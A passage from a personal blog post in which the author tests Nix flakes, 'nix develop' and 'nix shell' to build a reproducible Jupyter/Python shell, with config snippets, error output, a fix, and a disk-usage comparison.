font-style: inherit;">=</span> inputs @ <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">nixpkgs</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">...}</span>: <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">let</span></span>
<span id="cb5-6"></span>
<span id="cb5-7">    <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">pkgs</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">import</span> nixpkgs <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{};</span></span>
<span id="cb5-8"></span>
<span id="cb5-9">    <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">forAllSystems</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">function</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb5-10">      nixpkgs.lib.genAttrs <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[</span></span>
<span id="cb5-11">        <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"x86_64-linux"</span></span>
<span id="cb5-12">        <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"aarch64-linux"</span></span>
<span id="cb5-13">      <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">]</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">system</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb5-14">        function <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">import</span> nixpkgs <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb5-15">          <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">inherit</span> system<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb5-16">          <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">config</span>.<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">allowUnfree</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="cn" style="color: #8f5902;
background-color: null;
font-style: inherit;">true</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb5-17">        <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}));</span></span>
<span id="cb5-18"></span>
<span id="cb5-19">  <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">in</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb5-20"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">packages</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> forAllSystems <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">pkgs</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb5-21">      <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">default</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> pkgs.jupyter<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb5-22">    <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">});</span></span>
<span id="cb5-23">  <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">};</span></span>
<span id="cb5-24"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span></span></code></pre></div>
</div>
<p>And this makes the <code>jupyter</code> command available to me in my shell, and the library I called upon. But, this doesn’t seem scalable. How do I get this to do more packages? How do I get this to do environment variables? And is this really better than <code>nix develop</code>?</p>
<p>I started to do some testing. The big problem, I’ve found with nix develop, is that since it is designed for development, it brings in development dependencies, regardless of the fact that I am <em>not</em> doing development, and am instead just aiming for a reproducible shell environment.</p>
<div class="sourceCode" id="cb6" style="background: #f1f3f5;"><pre class="sourceCode nix code-with-copy"><code class="sourceCode nix"><span id="cb6-1">devShells = forAllSystems <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">pkgs</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb6-2">      <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">default</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> pkgs.mkShell <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb6-3"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">#         packages = with pkgs; [</span></span>
<span id="cb6-4"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">#             jupyter</span></span>
<span id="cb6-5"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">#            ];</span></span>
<span id="cb6-6">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">buildInputs</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">with</span> pkgs<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[</span> jupyter <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">];</span></span>
<span id="cb6-7">      <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">};</span></span></code></pre></div>
<p>Results in:</p>
<details>
<summary>
Show path
</summary>
<div class="sourceCode" id="cb7" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb7-1">[moonpie@lizard flake-test]$ nix develop</span>
<span id="cb7-2">warning: Git tree '/home/moonpie/vscode/test/flake-test' is dirty</span>
<span id="cb7-3">evaluating derivation 'git+file:///home/moonpie/vscode/test/flake-test#devShells.x86_64-linux.default'</span>
<span id="cb7-4">(nix:nix-shell-env) [moonpie@lizard flake-test]$ echo $PATH</span>
<span id="cb7-5">/nix/store/pdqndw2kgjv8l3kd5ii0c833jqmxdanq-patchelf-0.15.0/bin:/nix/store/mpm3i0sbqc9svfch6a17179fs64dz2kv-gcc-wrapper-13.3.0/bin:/nix/store/zc0nsv23pakbafngjy32kvhfzb16as43-gcc-13.3.0/bin:/nix/store/082x03cmpnsqkfp4ljrhsadz68rh3q1h-glibc-2.39-52-bin/bin:/nix/store/i7qhgc0bs725qw3wdanznfkdna4z2ns2-coreutils-9.5/bin:/nix/store/l46fjkzva0bhvy9p2r7p4vi68kr7a1db-binutils-wrapper-2.41/bin:/nix/store/wwfrj9kvfi14xclc38qfwm71ah6aawdh-binutils-2.41/bin:/nix/store/hn4bklvwvjjhkqy8d5npgb0aq8hba27s-python3-3.11.9-env/bin:/nix/store/i7qhgc0bs725qw3wdanznfkdna4z2ns2-coreutils-9.5/bin:/nix/store/rr1yixvn0z63mgq9s04ig9j9qlz23s2g-findutils-4.9.0/bin:/nix/store/j4gkc44c1pwl5ccgxm83s4r746bsdcw9-diffutils-3.10/bin:/nix/store/ks6c62g0m3gqrs5i7m0cv6d6aqhdvirn-gnused-4.9/bin:/nix/store/md9apn3290h7kv0x198ihaaa3k6icg4b-gnugrep-3.11/bin:/nix/store/hkx0wcm23i9ihqlysri8n41kl232kawb-gawk-5.2.2/bin:/nix/store/95ljdxg4drk1iq8jkjfq2c0z5vbwv8vm-gnutar-1.35/bin:/nix/store/nc9lq1lra01932rfyclq3gsh82cxbmii-gzip-1.13/bin:/nix/store/cyc3v8qfkhn4r38a8s5d7f2c33q624mz-bzip2-1.0.8-bin/bin:/nix/store/18z454gyz0wpb641rw6gpqk0vi4wbxy6-gnumake-4.4.1/bin:/nix/store/agkxax48k35wdmkhmmija2i2sxg8i7ny-bash-5.2p26/bin:/nix/store/r05c0lpbnjc8dg3rrr3ck7s07pjy86j3-patch-2.7.6/bin:/nix/store/qqhrymypl970jc6npvi9a6sikhr84mdf-xz-5.4.6-bin/bin:/nix/store/qcqmiq1mb3pkk2bxbj6d6gb2fk9knk8l-file-5.45/bin:/home/moonpie/.nix-profile/bin:/nix/var/nix/profiles/default/bin:/home/moonpie/.nix-profile/bin:/nix/var/nix/profiles/default/bin:/home/moonpie/.nix-profile/bin:/nix/var/nix/profiles/default/bin:/usr/local/sbin:/usr/local/bin:/usr/bin:/usr/lib/jvm/default/bin:/usr/bin/site_perl:/usr/bin/vendor_perl:/usr/bin/core_perl</span></code></pre></div>
</details>
<p>Compared to the same thing for nix shell:</p>
<div class="sourceCode" id="cb8" style="background: #f1f3f5;"><pre class="sourceCode nix code-with-copy"><code class="sourceCode nix"><span id="cb8-1">packages = forAllSystems <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">pkgs</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb8-2">      <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">default</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> pkgs.mkShell <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb8-3">        <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">#packages = with pkgs; [ jupyter ];</span></span>
<span id="cb8-4">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">buildInputs</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">with</span> pkgs<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[</span> jupyter <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">];</span></span>
<span id="cb8-5">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">TEST_ENV</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"test environment variable"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb8-6">      <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">};</span></span></code></pre></div>
<details>
<summary>
Show path
</summary>
<div class="sourceCode" id="cb9" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb9-1">[moonpie@lizard flake-test]$ nix shell</span>
<span id="cb9-2">warning: Git tree '/home/moonpie/vscode/test/flake-test' is dirty</span>
<span id="cb9-3">evaluating derivation 'git+file:///home/moonpie/vscode/test/flake-test#packages.x86_64-linux.default'</span>
<span id="cb9-4">[moonpie@lizard flake-test]$ echo $PATH</span>
<span id="cb9-5">/home/moonpie/.nix-profile/bin:/nix/var/nix/profiles/default/bin:/nix/store/i4zy8833s3dxrk3dmzb29k3y6rik15a4-nix-shell/bin:/home/moonpie/.nix-profile/bin:/nix/var/nix/profiles/default/bin:/home/moonpie/.nix-profile/bin:/nix/var/nix/profiles/default/bin:/usr/local/sbin:/usr/local/bin:/usr/bin:/usr/lib/jvm/default/bin:/usr/bin/site_perl:/usr/bin/vendor_perl:/usr/bin/core_perl</span></code></pre></div>
</details>
<p>However…</p>
<div class="sourceCode" id="cb10" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb10-1">[moonpie@lizard flake-test]$ echo $TEST_ENV</span></code></pre></div>
<p>And nothing. (no reply to that command means the environment variable is unset). <code>nix shell</code> does not seem to set environment variables at all, even if I set them in the <code>pkgs.mkShell</code>, compared to <code>nix develop</code>, which does that.</p>
<p>However, I don’t want to bring <em>every</em> single build dependency as just for my shell environments.</p>
<p>I did more testing with the various <a href="http://ryantm.github.io/nixpkgs/stdenv/stdenv/#ssec-stdenv-dependencies-reference">types of dependencies</a> that a <code>pkgs.mkShell</code> (or more accurately, what it abstracts, <code>stdenv.mkDerivation</code>), and every single type of them brings build dependencies. This is a feature of nix develop, but it is becoming a hindrance.</p>
<p>Nevermind. Apparently, <code>nix-shell</code> also brings in build dependencies, and behaves identically to <code>nix develop</code>, and completely unlike <code>nix shell</code>. Some part of me wonders if there is some way to get this working. Another part of me doesn’t care.</p>
<p>Since I have something working, I modified the <a href="https://nixos.wiki/wiki/flakes#Super_fast_nix-shell">super fast nix shell</a> example to not use flakes.</p>
<div class="sourceCode" id="cb11" style="background: #f1f3f5;"><pre class="sourceCode nix code-with-copy"><code class="sourceCode nix"><span id="cb11-1"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb11-2">  <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">inputs</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb11-3">    <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">nixpkgs</span>.<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">url</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"nixpkgs"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb11-4">  <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">};</span></span>
<span id="cb11-5">  <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">outputs</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> inputs @ <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">nixpkgs</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">...}</span>: <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">let</span></span>
<span id="cb11-6"></span>
<span id="cb11-7">    <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">pkgs</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">import</span> nixpkgs <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{};</span></span>
<span id="cb11-8"></span>
<span id="cb11-9">    <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">forAllSystems</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">function</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb11-10">      nixpkgs.lib.genAttrs <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[</span></span>
<span id="cb11-11">        <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"x86_64-linux"</span></span>
<span id="cb11-12">        <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"aarch64-linux"</span></span>
<span id="cb11-13">      <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">]</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">system</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb11-14">        function <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">import</span> nixpkgs <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb11-15">          <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">inherit</span> system<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb11-16">          <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">config</span>.<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">allowUnfree</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="cn" style="color: #8f5902;
background-color: null;
font-style: inherit;">true</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb11-17">        <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}));</span></span>
<span id="cb11-18"></span>
<span id="cb11-19">  <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">in</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb11-20"></span>
<span id="cb11-21">    <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">devShells</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> forAllSystems <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">pkgs</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb11-22">      <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">default</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">import</span> <span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">./shell.nix</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">inherit</span> pkgs<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">};</span></span>
<span id="cb11-23">    <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">});</span></span>
<span id="cb11-24">  <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">};</span></span>
<span id="cb11-25"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span></span></code></pre></div>
<p>This errors:</p>
<details>
<summary>
Show errors
</summary>
<div class="sourceCode" id="cb12" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb12-1">[moonpie@lizard moonpiedumplings.github.io]$ nix develop</span>
<span id="cb12-2">warning: Git tree '/home/moonpie/vscode/moonpiedumplings.github.io' is dirty</span>
<span id="cb12-3">warning: creating lock file '/home/moonpie/vscode/moonpiedumplings.github.io/flake.lock':</span>
<span id="cb12-4">• Added input 'nixpkgs':</span>
<span id="cb12-5">    'github:NixOS/nixpkgs/3f84a279f1a6290ce154c5531378acc827836fbb?narHash=sha256-u1fA0DYQYdeG%2B5kDm1bOoGcHtX0rtC7qs2YA2N1X%2B%2BI%3D' (2024-06-13)</span>
<span id="cb12-6">warning: Git tree '/home/moonpie/vscode/moonpiedumplings.github.io' is dirty</span>
<span id="cb12-7">error:</span>
<span id="cb12-8">       … while calling the 'import' builtin</span>
<span id="cb12-9">         at /nix/store/jd6fy6iw7fsj0135phhd7awmq5s00sgj-source/flake.nix:22:17:</span>
<span id="cb12-10">           21|     devShells = forAllSystems (pkgs: {</span>
<span id="cb12-11">           22|       default = import ./shell.nix { inherit pkgs; };</span>
<span id="cb12-12">             |                 ^</span>
<span id="cb12-13">           23|     });</span>
<span id="cb12-14"></span>
<span id="cb12-15">       … while evaluating the file '/nix/store/jd6fy6iw7fsj0135phhd7awmq5s00sgj-source/shell.nix':</span>
<span id="cb12-16"></span>
<span id="cb12-17">       … while calling the 'import' builtin</span>
<span id="cb12-18">         at /nix/store/jd6fy6iw7fsj0135phhd7awmq5s00sgj-source/shell.nix:2:12:</span>
<span id="cb12-19">            1| let</span>
<span id="cb12-20">            2|     pkgs = import &lt;nixpkgs&gt; {};</span>
<span id="cb12-21">             |            ^</span>
<span id="cb12-22">            3|</span>
<span id="cb12-23"></span>
<span id="cb12-24">       (stack trace truncated; use '--show-trace' to show the full trace)</span>
<span id="cb12-25"></span>
<span id="cb12-26">       error: cannot look up '&lt;nixpkgs&gt;' in pure evaluation mode (use '--impure' to override)</span>
<span id="cb12-27">[moonpie@lizard moonpiedumplings.github.io]$ nix develop --impure</span>
<span id="cb12-28">warning: Git tree '/home/moonpie/vscode/moonpiedumplings.github.io' is dirty</span>
<span id="cb12-29">error: attempt to call something which is not a function but a set: { type = "derivation"; PYTHONPATH = «thunk»; QUARTO_PANDOC = «thunk»; QUARTO_PYTHON = «thunk»; __ignoreNulls = true; __structuredAttrs = «thunk»; all = «thunk»; args = «thunk»; buildInputs = «thunk»; buildPhase = "{ echo \"------------------------------------------------------------\";\n  echo \" WARNING: the existence of this path is not guaranteed.\";\n  echo \" It is an internal implementation detail for pkgs.mkShell.\";\n  echo \"------------------------------------------------------------\";\n  echo;\n  # Record all build inputs as runtime dependencies\n  export;\n} &gt;&gt; \"$out\"\n"; «36 attributes elided» }</span>
<span id="cb12-30">       at /nix/store/0symal17vrawjkdmbp0afyrz45ax5fay-source/flake.nix:22:17:</span>
<span id="cb12-31">           21|     devShells = forAllSystems (pkgs: {</span>
<span id="cb12-32">           22|       default = import ./shell.nix { inherit pkgs; };</span>
<span id="cb12-33">             |                 ^</span>
<span id="cb12-34">           23|     });</span></code></pre></div>
</details>
<p>Okay, I got it. There was one change I needed to make.</p>
<div class="code-with-filename">
<div class="code-with-filename-file">
<pre><strong>shell.nix</strong></pre>
</div>
<div class="sourceCode" id="cb13" data-filename="shell.nix" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb13-1">let</span>
<span id="cb13-2">    pkgs = import &lt;nixpkgs&gt; {};</span>
<span id="cb13-3">    python3 = pkgs.python311;</span></code></pre></div>
</div>
<p>In my shell.nix, I should have:</p>
<div class="code-with-filename">
<div class="code-with-filename-file">
<pre><strong>shell.nix</strong></pre>
</div>
<div class="sourceCode" id="cb14" data-filename="shell.nix" style="background: #f1f3f5;"><pre class="sourceCode nix code-with-copy"><code class="sourceCode nix"><span id="cb14-1"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">pkgs</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">?</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">import</span> &lt;nixpkgs&gt; <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{}</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span>:</span>
<span id="cb14-2"></span>
<span id="cb14-3"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">let</span></span>
<span id="cb14-4">    <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">python3</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> pkgs.python311<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span></code></pre></div>
</div>
<p>One last thing. What does the <code>@</code> symbol do? I suspect nothing. Kate (my IDE for nix testing), complains about the <code>input</code> binding being unused, so I am gussing it doesn’t do anything.</p>
<p>When I remove it, and replace that line with:</p>
<p><code>outputs = {nixpkgs, ...}: let</code></p>
<p>It works fine.</p>
<p>After all of this, I did realize something.</p>
<p>The configuration file for nix has an option called “extra-nix-path”</p>
<div class="code-with-filename">
<div class="code-with-filename-file">
<pre><strong>/etc/nix/nix.conf</strong></pre>
</div>
<div class="sourceCode" id="cb15" data-filename="/etc/nix/nix.conf" style="background: #f1f3f5;"><pre class="sourceCode nix code-with-copy"><code class="sourceCode nix"><span id="cb15-1">build<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>users<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>group = nixbld</span>
<span id="cb15-2">experimental<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>features = nix<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>command flakes repl<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>flake</span>
<span id="cb15-3">auto<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>optimise<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>store = <span class="cn" style="color: #8f5902;
background-color: null;
font-style: inherit;">true</span></span>
<span id="cb15-4">bash<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>prompt<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>prefix = <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">nix</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>$name<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">)</span>\<span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">040</span></span>
<span id="cb15-5">max<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>jobs = auto</span>
<span id="cb15-6">extra<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>nix<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>path = nixpkgs=<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">flake</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>nixpkgs</span>
<span id="cb15-7">upgrade<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>nix<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>store<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>path<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>url = <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">https</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">://</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">install.determinate.systems/nix-upgrade/stable/universal</span></span></code></pre></div>
</div>
<p>This option makes channel commands available and working, even though no nix channels are actually installed. Meaning, I could have continued to use <code>nix-shell</code>, and it would have worked…</p>
<p>Well, flakes still have their own benefits. The version of <code>nixpkgs</code> used is tracked in a <code>flake.lock</code> file in the git repo. This ensures reproducibility, as I would be able to update the version of <code>nixpkgs</code> for everyone using the repo, rather than having to rely on people updating their channels manually (running <code>nix-channel --update</code>). With the latter, channels will result in a different version of <code>nixpkgs</code> being used, but with flakes, everybody uses the same version of <code>nixpkgs</code>.</p>
<p>However, I still would like to know if there is a way to not bring along every development dependency.</p>
<p>Okay, I asked on the Nixos Discord about not bringing along every development dependency, and I was told that wasn’t how <code>nix develop</code> worked. Rather, they claimed, the default <code>pkgs.mkShell</code> brings upon a “standard environment” of some build tools like gcc. Alternatively, you can use <code>pkgs.mkShellNoCC</code>.</p>
<p>This actually, works, to an extent. Using <a href="https://github.com/utdemir/nix-tree">nix-tree</a>, I can analyze the disk space used by the various things downloaded by nix.</p>
<p>With the standard environment:</p>
<div class="sourceCode" id="cb16" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb16-1">┌───────────────────────────────────────────┬───────────────────────────────────────────┬───────────────────────────────────────────┐</span>
<span id="cb16-2">│nix-shell               7.49 GiB (7.49 GiB)│texlive-combined-full-2 6.24 GiB (5.62 GiB)│fonts.conf               3.64 GiB (3.1 KiB)│</span>
<span id="cb16-3">│                                           │quarto-1.5.25          1.5 GiB (620.99 MiB)│texlive-combined-full-2 3.64 GiB (2.38 MiB)│</span>
<span id="cb16-4">│                                           │python3-3.11.9-env  916.46 MiB (282.95 MiB)│texlive-combined-full-2 3.64 GiB (3.52 KiB)│</span>
<span id="cb16-5">│                                           │stdenv-linux        332.93 MiB (166.29 KiB)│texlive-combined-full-2 3.64 GiB (3.45 GiB)│</span>
<span id="cb16-6">│                                           │gcc-wrapper-13.3.0   312.31 MiB (60.92 KiB)│asymptote-2.88        1.24 GiB (660.91 MiB)│</span>
<span id="cb16-7">│                                           │npm-10.8.1           310.91 MiB (97.35 MiB)│tlcockpit-1.2        1022.89 MiB (1.12 KiB)│</span>
<span id="cb16-8">│                                           │gcc-13.3.0          274.27 MiB (223.02 MiB)│arara-7.1.3           966.03 MiB (1.14 KiB)│</span>
<span id="cb16-9">│                                           │binutils-wrapper-2.41  86.52 MiB (50.1 KiB)│latex2nemeth-1.1.3       957.76 MiB (768.0)│</span>
<span id="cb16-10">│                                           │binutils-2.41         71.24 MiB (31.32 MiB)│albatross-0.5.1       955.15 MiB (1.16 KiB)│</span>
